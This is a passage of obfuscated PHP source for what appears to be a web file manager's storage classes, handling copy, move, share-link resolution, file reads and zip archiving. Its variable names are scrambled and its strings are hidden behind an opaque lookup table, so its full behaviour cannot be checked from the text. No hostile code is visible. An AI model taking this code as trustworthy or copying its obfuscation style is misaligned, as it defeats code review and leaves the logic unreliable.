$bÒ»×‘ƒæ½, $EŠÍ¨Ìï, $c•Ë÷›¬Ê, $Fê‹ãÀÊ‘); $bšêò‡ñ·Õ = self::driverIsSame($bÒ»×‘ƒæ½, $c•Ë÷›¬Ê); if ($bšêò‡ñ·Õ) { if ($B§ô×Œ¬ÕÀ == $Dì‡¼µ®ÖË[492] && !method_exists($c•Ë÷›¬Ê, $Dì‡¼µ®ÖË[993]) && trim($Fê‹ãÀÊ‘, $Dì‡¼µ®ÖË[8]) == trim($c•Ë÷›¬Ê->pathFather($EŠÍ¨Ìï), $Dì‡¼µ®ÖË[8])) { return $c•Ë÷›¬Ê->getPathOuter($EŠÍ¨Ìï); } if (method_exists($c•Ë÷›¬Ê, $B§ô×Œ¬ÕÀ)) { return $c•Ë÷›¬Ê->{$B§ô×Œ¬ÕÀ}($EŠÍ¨Ìï, $Fê‹ãÀÊ‘, $aÅĞ¾Íâç); } } goto d¥—™ø¯¹; Cô¶âÕĞ¤Š: $Dì‡¼µ®ÖË =& $_SERVER[îÖ]; if (!$EŠÍ¨Ìï || $EŠÍ¨Ìï == $Dì‡¼µ®ÖË[8] || !$Fê‹ãÀÊ‘) { return !1; } ignore_timeout(); goto E¥¨Óœº»…; E¥¨Óœº»…: $bÒ»×‘ƒæ½ = self::driverMake($EŠÍ¨Ìï); $c•Ë÷›¬Ê = self::driverMake($Fê‹ãÀÊ‘); $f–åğ‘‚ª” = $B§ô×Œ¬ÕÀ == $Dì‡¼µ®ÖË[492]; goto Dô‚š¡ŞÕ; Dô‚š¡ŞÕ: $D«ËÚÊ÷‹’ = !1; if ($c•Ë÷›¬Ê->pathParse[$Dì‡¼µ®ÖË[992]]) { $Fê‹ãÀÊ‘ = $c•Ë÷›¬Ê->pathParse[$Dì‡¼µ®ÖË[992]]; $D«ËÚÊ÷‹’ = $c•Ë÷›¬Ê; $c•Ë÷›¬Ê = self::driverMake($Fê‹ãÀÊ‘); } self::check($bÒ»×‘ƒæ½, $EŠÍ¨Ìï, $c•Ë÷›¬Ê, $Fê‹ãÀÊ‘); goto CÜ¼÷Èğ†¬; d¥—™ø¯¹: $Bœ—÷ê‹‰§ = $bÒ»×‘ƒæ½->isFile($EŠÍ¨Ìï); if (!$Bœ—÷ê‹‰§ && $c•Ë÷›¬Ê->getType() == $Dì‡¼µ®ÖË[693] && $bÒ»×‘ƒæ½->getType() == $Dì‡¼µ®ÖË[102]) { $cã¨³ÜÜí¬ = $c•Ë÷›¬Ê->copyFolderFromIO($bÒ»×‘ƒæ½, $EŠÍ¨Ìï, $Fê‹ãÀÊ‘, $aÅĞ¾Íâç, $f–åğ‘‚ª”, $D†­Ÿ›“‡¬); } else { $cã¨³ÜÜí¬ = self::copyPath($bÒ»×‘ƒæ½, $EŠÍ¨Ìï, $c•Ë÷›¬Ê, $Fê‹ãÀÊ‘, $aÅĞ¾Íâç, $f–åğ‘‚ª”, $Bœ—÷ê‹‰§, $D†­Ÿ›“‡¬); } if ($cã¨³ÜÜí¬ && $f–åğ‘‚ª”) { $bÒ»×‘ƒæ½->remove($EŠÍ¨Ìï); } goto A­ï‚´§×º; d¢Ä»†¤¯: } private static function check($Báš³ç„æ¦, $CÑ­÷¡“Î, $e„‹ñ´Î, &$eçÓ–ß±Ç•) { $a¶Íòá¾²  =& $_SERVER[îÖ]; if (self::driverIsSame($Báš³ç„æ¦, $e„‹ñ´Î) && $Báš³ç„æ¦->isFolder($CÑ­÷¡“Î) && $Báš³ç„æ¦->isParentOf($CÑ­÷¡“Î, $eçÓ–ß±Ç•)) { show_json(LNG($a¶Íòá¾² [994]), !1); } if (!$Báš³ç„æ¦->exist($CÑ­÷¡“Î)) { show_json(LNG($a¶Íòá¾² [101]), !1); } } private static function copyPath($eŒÚÏ¸¬È×, $CÇÙÖâ¦¬Œ, $e™»ğöãîñ, $AÌ…²‘¨ãĞ, $eƒÃØğñ, $E…•†çàïÜ, $EÏ¸É¨­­ˆ, $D„½¥å £í = false) { goto fÌÕ®ã¨×ˆ; fÌÕ®ã¨×ˆ: $A¨ö­Öˆ‘ =& $_SERVER[îÖ]; $FÎ¦‰ˆÁŞ = $D„½¥å £í ? $D„½¥å £í : $eŒÚÏ¸¬È×->getPathName($eŒÚÏ¸¬È×->pathThis($CÇÙÖâ¦¬Œ)); if ($eƒÃØğñ) { $f¾ÚñœóÌî = $e™»ğöãîñ->fileNameExist($AÌ…²‘¨ãĞ, $FÎ¦‰ˆÁŞ); $FÎ¦‰ˆÁŞ = $e™»ğöãîñ->fileNameAuto($AÌ…²‘¨ãĞ, $FÎ¦‰ˆÁŞ, $eƒÃØğñ, !$EÏ¸É¨­­ˆ); $eƒÃØğñ = $f¾ÚñœóÌî ? $eƒÃØğñ : !1; } goto fºÆ®À‹ğù; fºÆ®À‹ğù: if ($EÏ¸É¨­­ˆ) { return self::copyFile($eŒÚÏ¸¬È×, $CÇÙÖâ¦¬Œ, $e™»ğöãîñ, $AÌ…²‘¨ãĞ, $FÎ¦‰ˆÁŞ, $E…•†çàïÜ); } if ($eƒÃØğñ == REPEAT_RENAME_FOLDER) { $eƒÃØğñ = !1; } $c´‘›ÔÌí = rtrim($AÌ…²‘¨ãĞ, $A¨ö­Öˆ‘[8]) . $A¨ö­Öˆ‘[8] . $FÎ¦‰ˆÁŞ; goto CÈ‰‚‰¡ ; CÈ‰‚‰¡ : $Bòï¢­ÈÖ¤ = $e™»ğöãîñ->mkdir($e™»ğöãîñ->getPath($c´‘›ÔÌí)); $AÌ…²‘¨ãĞ = $e™»ğöãîñ->getPathInner($Bòï¢­ÈÖ¤); $D‘‹‰¥éøƒ = $eŒÚÏ¸¬È×->listPath($CÇÙÖâ¦¬Œ, !0); goto EˆáÚ²‚Ôè; EˆáÚ²‚Ôè: $Bï‹‘Å˜ù¸ = array_merge($D‘‹‰¥éøƒ[$A¨ö­Öˆ‘[73]], $D‘‹‰¥éøƒ[$A¨ö­Öˆ‘[74]]); foreach ($Bï‹‘Å˜ù¸ as $eïåºŠ˜¡) { $fæŒ£µ”êº = $eïåºŠ˜¡[$A¨ö­Öˆ‘[29]] == $A¨ö­Öˆ‘[167]; $CÇÙÖâ¦¬Œ = $eŒÚÏ¸¬È×->getPathInner($eïåºŠ˜¡[$A¨ö­Öˆ‘[75]]); $BŠ›‘“–Öë = self::copyPath($eŒÚÏ¸¬È×, $CÇÙÖâ¦¬Œ, $e™»ğöãîñ, $AÌ…²‘¨ãĞ, $eƒÃØğñ, $E…•†çàïÜ, $fæŒ£µ”êº); if (!$BŠ›‘“–Öë) { write_log($A¨ö­Öˆ‘[995] . $CÇÙÖâ¦¬Œ . $A¨ö­Öˆ‘[996] . $AÌ…²‘¨ãĞ, $A¨ö­Öˆ‘[997]); } } return $Bòï¢­ÈÖ¤; goto d™é§õÍÙ; d™é§õÍÙ: } private static function copyFile($f–Ëå²çÑó, $EÑÃŒƒÊÌø, $FöÔ¯‹íİ, $F¾–ñÍòÌØ, $EÀò¡çà½î, $f²œº¼áÀê) { goto eò„İ¥•ùÕ; CóÌé…Ò: mk_dir($EµÁ‹é¹¦Õ); $eÆ›®õö„ = $EµÁ‹é¹¦Õ . $F¤Š‹ÍöÔÎ; $eÆ›®õö„ = $f–Ëå²çÑó->download($EÑÃŒƒÊÌø, $eÆ›®õö„); goto Dã¸¬çÎ†È; Dã¸¬çÎ†È: $eÆ›®õö„ = $f–Ëå²çÑó->iconvApp($eÆ›®õö„); $B²‰—“Ë¹ƒ = $FöÔ¯‹íİ->upload($F¾–ñÍòÌØ, $eÆ›®õö„, $f²œº¼áÀê); self::remove($EµÁ‹é¹¦Õ . $F¤Š‹ÍöÔÎ); goto D±êÊ–÷áæ; bŒÓŸãóÊß: Hook::trigger($bŸÎ¬õ™¡[999], $f–Ëå²çÑó, $EÑÃŒƒÊÌø, $FöÔ¯‹íİ, $F¾–ñÍòÌØ, $EÀò¡çà½î, $F¤Š‹ÍöÔÎ); if (self::driverIsSame($f–Ëå²çÑó, $FöÔ¯‹íİ)) { if ($f²œº¼áÀê) { $B²‰—“Ë¹ƒ = $FöÔ¯‹íİ->moveFile($EÑÃŒƒÊÌø, $F¾–ñÍòÌØ); } else { $B²‰—“Ë¹ƒ = $FöÔ¯‹íİ->copyFile($EÑÃŒƒÊÌø, $F¾–ñÍòÌØ); } Hook::trigger($bŸÎ¬õ™¡[1000], $f–Ëå²çÑó, $EÑÃŒƒÊÌø, $FöÔ¯‹íİ, $F¾–ñÍòÌØ, $EÀò¡çà½î, $B²‰—“Ë¹ƒ); return $B²‰—“Ë¹ƒ; } $EµÁ‹é¹¦Õ = TEMP_FILES; goto CóÌé…Ò; D±êÊ–÷áæ: Hook::trigger($bŸÎ¬õ™¡[1000], $f–Ëå²çÑó, $EÑÃŒƒÊÌø, $FöÔ¯‹íİ, $F¾–ñÍòÌØ, $EÀò¡çà½î, $B²‰—“Ë¹ƒ); return $B²‰—“Ë¹ƒ; goto Cõ©¦‰„Ö; eò„İ¥•ùÕ: $bŸÎ¬õ™¡ =& $_SERVER[îÖ]; $F¾–ñÍòÌØ = $FöÔ¯‹íİ->getPath(rtrim($F¾–ñÍòÌØ, $bŸÎ¬õ™¡[8]) . $bŸÎ¬õ™¡[8] . $EÀò¡çà½î); $F¤Š‹ÍöÔÎ = $bŸÎ¬õ™¡[998] . time() . rand_string(5); goto bŒÓŸãóÊß; Cõ©¦‰„Ö: } public static function pathFather($b»˜§ÔàÇæ) { $eçÜàöó = IO::init($b»˜§ÔàÇæ); $fÊÔË’ÛÊĞ = $eçÜàöó->pathFather($eçÜàöó->path); return $eçÜàöó->getPathOuter($fÊÔË’ÛÊĞ); } public static function fileOut($e×ÁÉã‚¶ï, $Eèå©¼¥•ê = false, $e¿‘ëÒ÷‚ = false, $cˆ˜«ÎŠÏâ = '') { $B¯ğù¿¡Ì¼ = self::driverMake($e×ÁÉã‚¶ï); if ($B¯ğù¿¡Ì¼->isFileOutServer()) { return $B¯ğù¿¡Ì¼->fileOutServer($e×ÁÉã‚¶ï, $Eèå©¼¥•ê, $e¿‘ëÒ÷‚, $cˆ˜«ÎŠÏâ); } return $B¯ğù¿¡Ì¼->fileOut($e×ÁÉã‚¶ï, $Eèå©¼¥•ê, $e¿‘ëÒ÷‚, $cˆ˜«ÎŠÏâ); } public static function fileOutImage($D¬ÙæŠ¾Š, $f·ÁÅ…ô¢ = 250) { $bÛùî¦Î¦ = array(250, 600, 1200, 3000); for ($E‘ÕİÁÆ = 0; $E‘ÕİÁÆ < count($bÛùî¦Î¦); $E‘ÕİÁÆ++) { if ($E‘ÕİÁÆ == 0 && $f·ÁÅ…ô¢ <= $bÛùî¦Î¦[$E‘ÕİÁÆ]) { $f·ÁÅ…ô¢ = $bÛùî¦Î¦[$E‘ÕİÁÆ]; break; } else { if ($f·ÁÅ…ô¢ > $bÛùî¦Î¦[$E‘ÕİÁÆ - 1] && $f·ÁÅ…ô¢ <= $bÛùî¦Î¦[$E‘ÕİÁÆ]) { $f·ÁÅ…ô¢ = $bÛùî¦Î¦[$E‘ÕİÁÆ]; break; } else { if ($E‘ÕİÁÆ == count($bÛùî¦Î¦) - 1 && $f·ÁÅ…ô¢ > $bÛùî¦Î¦[$E‘ÕİÁÆ]) { $f·ÁÅ…ô¢ = $bÛùî¦Î¦[$E‘ÕİÁÆ]; break; } } } } $D²„ŒùÏİ = self::driverMake($D¬ÙæŠ¾Š); if ($D²„ŒùÏİ->isFileOutServer()) { return $D²„ŒùÏİ->fileOutImageServer($D¬ÙæŠ¾Š, $f·ÁÅ…ô¢); } return $D²„ŒùÏİ->fileOutImage($D¬ÙæŠ¾Š, $f·ÁÅ…ô¢); } private static function driverIsSame($A±¿¶¶³Ï¨, $aÁ¡ÄĞØ²«) { goto B¬ËâäÕŠˆ; eô‚ŠíÄŒ¥: if ($CµÂçİ†ôâ != $B—ª·ÏƒÀğ) { return !1; } if ($CµÂçİ†ôâ == $c–²É¯Ç×[693]) { return !0; } if ($CµÂçİ†ôâ == $c–²É¯Ç×[102]) { return !0; } goto F¾÷ä°á™ò; B¬ËâäÕŠˆ: $c–²É¯Ç× =& $_SERVER[îÖ]; $CµÂçİ†ôâ = $A±¿¶¶³Ï¨->getType(); $B—ª·ÏƒÀğ = $aÁ¡ÄĞØ²«->getType(); goto eô‚ŠíÄŒ¥; F¾÷ä°á™ò: if ($A±¿¶¶³Ï¨->pathDriver == $aÁ¡ÄĞØ²«->pathDriver) { return !0; } return !1; goto F©ÔÈ§Íµ¯; F©ÔÈ§Íµ¯: } public static function copyUpdate($c°¶²£ËóÕ, $aîÈ›¸ñœí) { goto cÕÃÑõ‘Ù”; Cº‡ËìİîÅ: $c¶ÈÒñŸÁš = self::_listAll($c°¶²£ËóÕ); $A¶â³Àå¼ä = self::_listAll($aîÈ›¸ñœí); $aôÂØóá¢‹ = array(); goto DÆ©õâŒ; DÆ©õâŒ: $f“‹»Î¹  = array(); foreach ($c¶ÈÒñŸÁš as $b‘œœÀâã => $dªªÄ) { if (isset($A¶â³Àå¼ä[$b‘œœÀâã])) { if ($dªªÄ[$fªİ‘Ÿ’ñ[76]] == 1) { continue; } if ($A¶â³Àå¼ä[$b‘œœÀâã][$fªİ‘Ÿ’ñ[77]] == $dªªÄ[$fªİ‘Ÿ’ñ[77]]) { continue; } } if ($dªªÄ[$fªİ‘Ÿ’ñ[76]] == 1) { $f“‹»Î¹ [] = $aîÈ›¸ñœí . $fªİ‘Ÿ’ñ[8] . $b‘œœÀâã; continue; } $B¥¢Àåñó‹ = strstr(trim($b‘œœÀâã, $fªİ‘Ÿ’ñ[8]), $fªİ‘Ÿ’ñ[8]) ? get_path_father($b‘œœÀâã) : $fªİ‘Ÿ’ñ[33]; $aôÂØóá¢‹[] = array($fªİ‘Ÿ’ñ[1001] => $dªªÄ[$fªİ‘Ÿ’ñ[75]], $fªİ‘Ÿ’ñ[1002] => rtrim($aîÈ›¸ñœí, $fªİ‘Ÿ’ñ[8]) . $fªİ‘Ÿ’ñ[8] . $B¥¢Àåñó‹, $fªİ‘Ÿ’ñ[1003] => $dªªÄ); } $AË¢ŒºÚ = array($fªİ‘Ÿ’ñ[167] => $aôÂØóá¢‹, $fªİ‘Ÿ’ñ[76] => $f“‹»Î¹ ); goto eğ„¨èÊ; eğ„¨èÊ: Hook::trigger($fªİ‘Ÿ’ñ[1004], $c°¶²£ËóÕ, $aîÈ›¸ñœí, $AË¢ŒºÚ); foreach ($f“‹»Î¹  as $dªªÄ) { IO::mkdir($dªªÄ); } foreach ($aôÂØóá¢‹ as $dªªÄ) { IO::copy($dªªÄ[$fªİ‘Ÿ’ñ[1001]], $dªªÄ[$fªİ‘Ÿ’ñ[1002]], REPEAT_REPLACE); } goto d”…²ØÓƒĞ; cÕÃÑõ‘Ù”: $fªİ‘Ÿ’ñ =& $_SERVER[îÖ]; if (!IO::exist($c°¶²£ËóÕ)) { return !1; } if (!IO::exist($aîÈ›¸ñœí)) { IO::mkdir($aîÈ›¸ñœí); } goto Cº‡ËìİîÅ; d”…²ØÓƒĞ: } private static function _listAll($AŠù¼§Æ¨) { $F±¦ÑÄ‡ÌÍ =& $_SERVER[îÖ]; $AŠù¼§Æ¨ = KodIO::clear($AŠù¼§Æ¨); $EŒ›ä³¯ö = IO::listAll($AŠù¼§Æ¨); foreach ($EŒ›ä³¯ö as &$f”• ½²óÕ) { $CÇôÄ…‹ÏÜ = substr($f”• ½²óÕ[$F±¦ÑÄ‡ÌÍ[75]], strlen($AŠù¼§Æ¨)); $f”• ½²óÕ[$F±¦ÑÄ‡ÌÍ[1005]] = trim($CÇôÄ…‹ÏÜ, $F±¦ÑÄ‡ÌÍ[8]); } return array_to_keyvalue($EŒ›ä³¯ö, $F±¦ÑÄ‡ÌÍ[1005]); } public static function fileSubstr($AÙ‡¬‰»µ, $cˆ¾Õ¸É, $FõÌÅ‰ø®÷ = false) { goto b±¾ëÑ•„Ÿ; cê…¶—Ş: $eìì­ÎƒÖˆ = $FõÌÅ‰ø®÷; if ($cˆ¾Õ¸É < 0) { $cˆ¾Õ¸É = $D‘ÁŠÑ‰÷ + $cˆ¾Õ¸É; } if ($FõÌÅ‰ø®÷ === !1) { $FõÌÅ‰ø®÷ = $D‘ÁŠÑ‰÷ - $cˆ¾Õ¸É; } goto BØ”á‡¡Ê; b±¾ëÑ•„Ÿ: $D–”Âã‹‘ = self::driverMake($AÙ‡¬‰»µ); $D‘ÁŠÑ‰÷ = $D–”Âã‹‘->size($AÙ‡¬‰»µ); $a§ÔŠèÇó = $cˆ¾Õ¸É; goto cê…¶—Ş; BØ”á‡¡Ê: if ($cˆ¾Õ¸É + $FõÌÅ‰ø®÷ > $D‘ÁŠÑ‰÷) { $FõÌÅ‰ø®÷ = $D‘ÁŠÑ‰÷ - $cˆ¾Õ¸É; } if ($FõÌÅ‰ø®÷ <= 0) { return $_SERVER[îÖ][33]; } if ($cˆ¾Õ¸É < 0 || $cˆ¾Õ¸É >= $D‘ÁŠÑ‰÷ || $FõÌÅ‰ø®÷ > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\x52\x65\x61\144\40\x65\162\x72\x6f\162\41\40\x73\164\x61\162\164\75{$cˆ¾Õ¸É}\x3b\x6c\145\156\147\x74\x68\x3d{$FõÌÅ‰ø®÷}\73\x20\163\x69\172\145\x3d{$D‘ÁŠÑ‰÷}\x3b"); } goto cˆĞñ¦ª‡ø; cˆĞñ¦ª‡ø: return $D–”Âã‹‘->fileSubstr($AÙ‡¬‰»µ, $cˆ¾Õ¸É, $FõÌÅ‰ø®÷); goto aãæÓ†Î„Ç; aãæÓ†Î„Ç: } private static function driverMake(&$fçª£Äùâ) { goto d’ù¦ˆåÑ; B®†Ï™ò¯Ç: return $eùÆ‡äğ…; goto aÌÑ”ì•øÄ; d’ù¦ˆåÑ: $eÜ¶‚³¾‡´ =& $_SERVER[îÖ]; $c“ØÓŒ´Çæ = KodIO::parse($fçª£Äùâ); if (!self::$driverListSystem) { $Dî¿‰©éğ = Model($eÜ¶‚³¾‡´[703])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Dî¿‰©éğ, $eÜ¶‚³¾‡´[367]); } goto cº£ÇÏäº¹; cº£ÇÏäº¹: if ($c“ØÓŒ´Çæ[$eÜ¶‚³¾‡´[29]] == KodIO::KOD_IO && !self::$driverListSystem[$c“ØÓŒ´Çæ[$eÜ¶‚³¾‡´[367]]]) { return !1; } $fçª£Äùâ = $c“ØÓŒ´Çæ[$eÜ¶‚³¾‡´[1006]]; $eùÆ‡äğ… = self::driverGet($c“ØÓŒ´Çæ, $fçª£Äùâ); goto B®†Ï™ò¯Ç; aÌÑ”ì•øÄ: } private static function driverGet($f¤®àåÚ, &$e³½¶êé¿Æ) { goto D²¬˜Å¦¢í; d”„ÈÑÉ¶Æ: $Fï‰â®ÆÎ„->path = $e³½¶êé¿Æ; return $Fï‰â®ÆÎ„; goto b¥¾Ìôã«‹; D²¬˜Å¦¢í: $E½ÌÒ¥» =& $_SERVER[îÖ]; $CìùáÂÂ¾ = $f¤®àåÚ[$E½ÌÒ¥»[1007]]; $EİÃ­³¿¤ = $f¤®àåÚ[$E½ÌÒ¥»[367]]; goto FŠìÊ¾¨§•; FŠìÊ¾¨§•: switch ($f¤®àåÚ[$E½ÌÒ¥»[29]]) { case KodIO::KOD_IO: $dßßÍÙæ¾Ï = self::$driverListSystem[$EİÃ­³¿¤]; break; case KodIO::KOD_SOURCE: $e³½¶êé¿Æ = $EİÃ­³¿¤ . $e³½¶êé¿Æ; $dßßÍÙæ¾Ï = array($E½ÌÒ¥»[1008] => $E½ÌÒ¥»[1009], $E½ÌÒ¥»[6] => $f¤®àåÚ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $aá»ëŸî’ = $GLOBALS[$E½ÌÒ¥»[1010]]; self::$driverListUser = array_to_keyvalue($aá»ëŸî’, $E½ÌÒ¥»[367]); } $dßßÍÙæ¾Ï = self::$driverListUser[$EİÃ­³¿¤]; break; case KodIO::KOD_SHARE_LINK: $dßßÍÙæ¾Ï = array($E½ÌÒ¥»[1008] => $E½ÌÒ¥»[1011], $E½ÌÒ¥»[6] => $f¤®àåÚ); $c¹¦¦£×ÇÉ = Action($E½ÌÒ¥»[1012])->sharePathInfo($f¤®àåÚ[$E½ÌÒ¥»[75]]); $e³½¶êé¿Æ = $c¹¦¦£×ÇÉ[$E½ÌÒ¥»[369]]; if (!$c¹¦¦£×ÇÉ[$E½ÌÒ¥»[369]]) { $B•‰ƒ¢‘ = Model($E½ÌÒ¥»[536])->getInfo($c¹¦¦£×ÇÉ[$E½ÌÒ¥»[441]]); $e³½¶êé¿Æ = KodIO::clear($B•‰ƒ¢‘[$E½ÌÒ¥»[1013]] . $f¤®àåÚ[$E½ÌÒ¥»[1006]]); $f¤®àåÚ[$E½ÌÒ¥»[439]] = $B•‰ƒ¢‘; $f¤®àåÚ[$E½ÌÒ¥»[992]] = $e³½¶êé¿Æ; $dßßÍÙæ¾Ï = array($E½ÌÒ¥»[1008] => $E½ÌÒ¥»[1014], $E½ÌÒ¥»[6] => $f¤®àåÚ); } break; case KodIO::KOD_SHARE_ITEM: $dßßÍÙæ¾Ï = array($E½ÌÒ¥»[1008] => $E½ÌÒ¥»[1015], $E½ÌÒ¥»[6] => $f¤®àåÚ); $B•‰ƒ¢‘ = Model($E½ÌÒ¥»[536])->getInfo($f¤®àåÚ[$E½ÌÒ¥»[367]]); if ($B•‰ƒ¢‘[$E½ÌÒ¥»[369]] == $E½ÌÒ¥»[468]) { $e³½¶êé¿Æ = KodIO::clear($B•‰ƒ¢‘[$E½ÌÒ¥»[1013]] . $f¤®àåÚ[$E½ÌÒ¥»[1006]]); $f¤®àåÚ[$E½ÌÒ¥»[439]] = $B•‰ƒ¢‘; $f¤®àåÚ[$E½ÌÒ¥»[992]] = $e³½¶êé¿Æ; $dßßÍÙæ¾Ï = array($E½ÌÒ¥»[1008] => $E½ÌÒ¥»[1016], $E½ÌÒ¥»[6] => $f¤®àåÚ); } else { if (!$e³½¶êé¿Æ) { $e³½¶êé¿Æ = $B•‰ƒ¢‘[$E½ÌÒ¥»[369]]; } } break; default: $e³½¶êé¿Æ = $f¤®àåÚ[$E½ÌÒ¥»[75]]; $dßßÍÙæ¾Ï = array($E½ÌÒ¥»[1008] => $E½ÌÒ¥»[1017]); break; } $E©¦¡Õ¸µ = $f¤®àåÚ[$E½ÌÒ¥»[75]]; if (!isset(self::$driverCache[$E©¦¡Õ¸µ])) { $e÷ÛÀßÕ‘õ = strtolower($dßßÍÙæ¾Ï[$E½ÌÒ¥»[90]]); $EºÇìÖ´®Á = $GLOBALS[$E½ÌÒ¥»[6]][$E½ÌÒ¥»[84]][$E½ÌÒ¥»[753]]; $dˆ´‘²‡¢– = $E½ÌÒ¥»[71] . (isset($EºÇìÖ´®Á[$e÷ÛÀßÕ‘õ]) ? $EºÇìÖ´®Á[$e÷ÛÀßÕ‘õ] : ucfirst($e÷ÛÀßÕ‘õ)); if (!class_exists($dˆ´‘²‡¢–)) { show_json("{$dˆ´‘²‡¢–}\x20\156\157\164\40\145\170\151\163\x74\163\41", !1); } $E´ËóªÁº“ = isset($dßßÍÙæ¾Ï[$E½ÌÒ¥»[6]]) ? $dßßÍÙæ¾Ï[$E½ÌÒ¥»[6]] : !1; self::$driverCache[$E©¦¡Õ¸µ] = new $dˆ´‘²‡¢–($E´ËóªÁº“); } goto e¬¨Î§Ñ‰å; bÓôŠ®ñğÁ: if (isset($dßßÍÙæ¾Ï[$E½ÌÒ¥»[6]][$E½ÌÒ¥»[1018]])) { $Fï‰â®ÆÎ„->pathBase = rtrim($dßßÍÙæ¾Ï[$E½ÌÒ¥»[6]][$E½ÌÒ¥»[1018]], $E½ÌÒ¥»[8]) . $E½ÌÒ¥»[8]; $e³½¶êé¿Æ = $Fï‰â®ÆÎ„->pathBase . ltrim($e³½¶êé¿Æ, $E½ÌÒ¥»[8]); } $e³½¶êé¿Æ = $Fï‰â®ÆÎ„->getPath($e³½¶êé¿Æ); if (isset($f¤®àåÚ[$E½ÌÒ¥»[992]])) { $e³½¶êé¿Æ = $f¤®àåÚ[$E½ÌÒ¥»[992]]; } goto d”„ÈÑÉ¶Æ; e¬¨Î§Ñ‰å: $Fï‰â®ÆÎ„ = self::$driverCache[$E©¦¡Õ¸µ]; $Fï‰â®ÆÎ„->pathDriver = $CìùáÂÂ¾; $Fï‰â®ÆÎ„->pathBase = $E½ÌÒ¥»[33]; goto bÓôŠ®ñğÁ; b¥¾Ìôã«‹: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $BğÇİŸ‰—; if (!$BğÇİŸ‰—) { $e‚½¼§‚×  = IO::init($_SERVER[îÖ][8]); } return $e‚½¼§‚× ; } private static function iconvSystem($Bà÷¶¯¾Ğé) { return self::local()->iconvSystem($Bà÷¶¯¾Ğé); } private static function iconvApp($BÔª´½¸¸) { return self::local()->iconvApp($BÔª´½¸¸); } public static function zip($Cˆ²İøĞßÒ, $cìÎİÔçéë = "\x7a\151\x70", $eô‡¨ö²Ø = '', $cŒãÛ¯ = REPEAT_RENAME) { goto dÈ´¨ ½ª¨; dÈ´¨ ½ª¨: $a¥ñŒò†ƒ =& $_SERVER[îÖ]; $aĞÙ‚àĞ²¢ = self::init($Cˆ²İøĞßÒ[0][$a¥ñŒò†ƒ[75]]); $e®¶æ×à—ã = self::info($Cˆ²İøĞßÒ[0][$a¥ñŒò†ƒ[75]]); goto FˆÁÌ¤äÙÙ; AåÍÍŠô¸: if (!$fÑæÔ‚Š¦) { del_dir($CÔÔ·ˆ®‘²); show_json(LNG($a¥ñŒò†ƒ[1021]), !1); } del_dir($CÔÔ·ˆ®‘²); return $fÑæÔ‚Š¦; goto aàôÅÜ†á¢; Cƒµñ„º¼è: if ($eô‡¨ö²Ø || !$CÔÔ·ˆ®‘²) { if ($CÔÔ·ˆ®‘² && strstr($CÔÔ·ˆ®‘², TEMP_FILES)) { $EæÂ…¼ìà¶ = $b¾Ÿ›†à×Ï = array(); recursion_dir($Bø£ŒˆîÀ, $EæÂ…¼ìà¶, $b¾Ÿ›†à×Ï, 0); foreach ($EæÂ…¼ìà¶ as $A»Ê‰½ù±) { del_dir($A»Ê‰½ù±); } foreach ($b¾Ÿ›†à×Ï as $f®ÈÅÒ§¹¸) { if ($f®ÈÅÒ§¹¸ == $e™´½º™·) { continue; } del_file($f®ÈÅÒ§¹¸); } } return $cğïÍ´ŒÊë; } $cÆ‘˜œªîÍ = self::pathFather($e®¶æ×à—ã[$a¥ñŒò†ƒ[75]]); $fÑæÔ‚Š¦ = self::move($cğïÍ´ŒÊë, $cÆ‘˜œªîÍ, $cŒãÛ¯); goto AåÍÍŠô¸; b¥æÀ›‘ˆ: if (count($b¾Ÿ›†à×Ï) > 1) { $d…óƒÕ¹‡è = IO::info(IO::pathFather($e®¶æ×à—ã[$a¥ñŒò†ƒ[75]])); $AŠÙÉ¦ˆÄ‡ = $d…óƒÕ¹‡è[$a¥ñŒò†ƒ[28]]; } $Bø£ŒˆîÀ = $CÔÔ·ˆ®‘²; if (!$Bø£ŒˆîÀ) { $Bø£ŒˆîÀ = get_path_father($e®¶æ×à—ã[$a¥ñŒò†ƒ[75]]); $eÀù×¼ïÀá = IO::info($Bø£ŒˆîÀ); if (!$eÀù×¼ïÀá[$a¥ñŒò†ƒ[189]]) { show_json(LNG($a¥ñŒò†ƒ[1020]), !1); } } goto CŠÚŸ†Í“; CŠÚŸ†Í“: $cğïÍ´ŒÊë = $Bø£ŒˆîÀ . $AŠÙÉ¦ˆÄ‡ . $a¥ñŒò†ƒ[91] . $cìÎİÔçéë; $cğïÍ´ŒÊë = get_filename_auto($cğïÍ´ŒÊë, $a¥ñŒò†ƒ[33], $cŒãÛ¯); $e™´½º™· = self::iconvSystem($cğïÍ´ŒÊë); goto A¯ìê…èŞ; A¯ìê…èŞ: foreach ($b¾Ÿ›†à×Ï as $dö§‚ Åøè => $cä«¬¬ñŠ”) { $b¾Ÿ›†à×Ï[$dö§‚ Åøè] = self::iconvSystem($cä«¬¬ñŠ”); } KodArchive::create($e™´½º™·, $b¾Ÿ›†à×Ï); if (!IO::exist($cğïÍ´ŒÊë)) { if ($CÔÔ·ˆ®‘²) { del_dir($CÔÔ·ˆ®‘²); } show_json(LNG($a¥ñŒò†ƒ[1021]), !1); } goto Cƒµñ„º¼è; FˆÁÌ¤äÙÙ: $CÔÔ·ˆ®‘² = !1; if (!$eô‡¨ö²Ø && $aĞÙ‚àĞ²¢->getType() == $a¥ñŒò†ƒ[102]) { $b¾Ÿ›†à×Ï = self::zipFileList($Cˆ²İøĞßÒ); } else { $CÔÔ·ˆ®‘² = $eô‡¨ö²Ø ? $eô‡¨ö²Ø : TEMP_FILES . $a¥ñŒò†ƒ[1019] . time() . rand_string(8) . $a¥ñŒò†ƒ[8]; mk_dir($CÔÔ·ˆ®‘²); $b¾Ÿ›†à×Ï = self::zipFileList($Cˆ²İøĞßÒ, $CÔÔ·ˆ®‘²); } $AŠÙÉ¦ˆÄ‡ = $e®¶æ×à—ã[$a¥ñŒò†ƒ[28]]; goto b¥æÀ›‘ˆ; aàôÅÜ†á¢: } public static function unzip($EÍâí™Ğ°Ò, $A—¨‘íÎ¨ = "\x72\x65\x70\154\x61\143\145") { goto DäÙ¹”ÀÓÚ; f±ÃµÈ§õ¯: if (!($DõÃù±µ¦— = parent::info($fÔ³Æ÷µ¢))) { show_json(LNG($e›ô¥Û‡Ó²[1023]), !1); } if (!($A¶ò™ä³· = parent::infoFull($Bˆ§‹½î™))) { $Bˆ§‹½î™ = parent::mkdir($Bˆ§‹½î™); $A¶ò™ä³· = 